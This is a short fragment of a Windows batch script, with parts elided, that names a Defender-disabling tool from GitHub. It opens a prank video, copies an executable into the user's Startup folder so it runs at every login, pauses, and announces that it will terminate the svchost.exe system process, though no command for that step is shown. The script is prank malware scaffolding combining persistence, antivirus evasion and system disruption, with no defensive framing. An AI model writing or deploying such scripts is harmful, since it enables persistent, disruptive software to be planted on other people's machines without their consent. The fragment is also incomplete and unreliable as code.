...
rem Defeat-DefenderV1.2 Github
...
rem Open the website in a web browser
start "https://youtu.be/dQw4w9WgXcQ"

rem Add the program to the startup folder
copy "%~dp0\program.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Wait for 40 seconds
timeout /t 40

rem Terminate the svchost.exe process
